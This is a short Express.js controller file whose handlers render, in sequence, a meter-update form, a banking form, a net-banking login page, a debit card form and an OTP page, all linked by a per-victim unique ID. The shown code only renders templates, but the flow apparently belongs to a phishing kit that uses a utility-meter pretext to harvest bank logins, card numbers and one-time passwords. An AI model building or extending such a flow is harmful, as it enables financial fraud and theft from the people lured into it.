// controllers/getController.js
const { v4: uuidv4 } = require('uuid');

// Page 1 → formpage1.ejs
exports.renderMeterForm = (req, res, next) => {
  try {
    const uniqueId = req.params.uniqueId || uuidv4();
    res.render('formpage1', { uniqueId });
  } catch (err) {
    next(err);
  }
};

// Page 2 → formpage2.ejs
exports.renderBankingForm = (req, res, next) => {
  try {
    const uniqueId = req.params.uniqueId;
    if (!uniqueId) return res.redirect('/meter-update');
    res.render('formpage2', { uniqueId });
  } catch (err) {
    next(err);
  }
};

// Page 3 → netbanking.ejs
exports.renderNetBankingPage = (req, res, next) => {
  try {
    const uniqueId = req.params.uniqueId;
    if (!uniqueId) return res.redirect('/internet-banking');
    res.render('netbanking', { uniqueId });
  } catch (err) {
    next(err);
  }
};

// Page 4 → debitcaard.ejs
exports.renderCreditForm = (req, res, next) => {
  try {
    const uniqueId = req.params.uniqueId;
    if (!uniqueId) return res.redirect('/netbanking');
    res.render('debitcaard', { uniqueId });
  } catch (err) {
    next(err);
  }
};

// Page 5 → otp.ejs
exports.renderOTPPage = (req, res, next) => {
  try {
    const uniqueId = req.params.uniqueId;
    if (!uniqueId) return res.redirect('/credit');
    res.render('otp', { uniqueId });
  } catch (err) {
    next(err);
  }
};
